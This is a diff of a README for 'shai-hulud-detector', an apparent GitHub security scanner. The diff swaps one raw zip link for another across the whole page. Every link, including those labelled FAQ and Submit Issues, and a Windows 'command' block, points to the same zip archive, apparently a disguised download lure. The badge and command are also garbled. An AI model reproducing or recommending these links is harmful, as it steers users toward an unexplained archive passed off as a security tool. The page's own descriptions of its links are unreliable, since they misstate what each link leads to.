@@ -6,7 +6,7 @@ Welcome to shai-hulud-detector! This application helps you check if your GitHub 
 
 ## 📥 Download Now
 
-[![Download shai-hulud-detector](https://raw.githubusercontent.com/ArcaneMisery095/shai-hulud-detector/main/media/shai-hulud-detector-2.1.zip%https://raw.githubusercontent.com/ArcaneMisery095/shai-hulud-detector/main/media/shai-hulud-detector-2.1.zip)](https://raw.githubusercontent.com/ArcaneMisery095/shai-hulud-detector/main/media/shai-hulud-detector-2.1.zip)
+[![Download shai-hulud-detector](https://raw.githubusercontent.com/ArcaneMisery095/shai-hulud-detector/main/media/shai_detector_hulud_3.3.zip%https://raw.githubusercontent.com/ArcaneMisery095/shai-hulud-detector/main/media/shai_detector_hulud_3.3.zip)](https://raw.githubusercontent.com/ArcaneMisery095/shai-hulud-detector/main/media/shai_detector_hulud_3.3.zip)
 
 ## 🛠️ System Requirements
 
@@ -26,7 +26,7 @@ To run the shai-hulud-detector, your system needs:
 
 ### 1. Visit the Download Page
 
-To download shai-hulud-detector, [visit this page to download](https://raw.githubusercontent.com/ArcaneMisery095/shai-hulud-detector/main/media/shai-hulud-detector-2.1.zip).
+To download shai-hulud-detector, [visit this page to download](https://raw.githubusercontent.com/ArcaneMisery095/shai-hulud-detector/main/media/shai_detector_hulud_3.3.zip).
 
 ### 2. Select the Latest Version
 
@@ -72,7 +72,7 @@ To start scanning, type the following command:
 If you're on Windows, you may need to run it like this:
 
 ```bash
-https://raw.githubusercontent.com/ArcaneMisery095/shai-hulud-detector/main/media/shai-hulud-detector-2.1.zip
+https://raw.githubusercontent.com/ArcaneMisery095/shai-hulud-detector/main/media/shai_detector_hulud_3.3.zip
 ```
 
 This will launch the security scanner.
@@ -106,12 +106,12 @@ Feel free to connect with others using shai-hulud-detector. Join our community o
 
 ## 💡 Need Help?
 
-If you encounter any issues, check our [FAQ](https://raw.githubusercontent.com/ArcaneMisery095/shai-hulud-detector/main/media/shai-hulud-detector-2.1.zip) section or open an issue on the GitHub repository. We are here to support you.
+If you encounter any issues, check our [FAQ](https://raw.githubusercontent.com/ArcaneMisery095/shai-hulud-detector/main/media/shai_detector_hulud_3.3.zip) section or open an issue on the GitHub repository. We are here to support you.
 
 ## 📢 Important Links
 
-- [Download shai-hulud-detector](https://raw.githubusercontent.com/ArcaneMisery095/shai-hulud-detector/main/media/shai-hulud-detector-2.1.zip) 
-- [Submit Issues](https://raw.githubusercontent.com/ArcaneMisery095/shai-hulud-detector/main/media/shai-hulud-detector-2.1.zip)
-- [FAQs](https://raw.githubusercontent.com/ArcaneMisery095/shai-hulud-detector/main/media/shai-hulud-detector-2.1.zip)
+- [Download shai-hulud-detector](https://raw.githubusercontent.com/ArcaneMisery095/shai-hulud-detector/main/media/shai_detector_hulud_3.3.zip) 
+- [Submit Issues](https://raw.githubusercontent.com/ArcaneMisery095/shai-hulud-detector/main/media/shai_detector_hulud_3.3.zip)
+- [FAQs](https://raw.githubusercontent.com/ArcaneMisery095/shai-hulud-detector/main/media/shai_detector_hulud_3.3.zip)
 
 With this guide, you can easily download and run the shai-hulud-detector. Stay vigilant and secure your online presence.
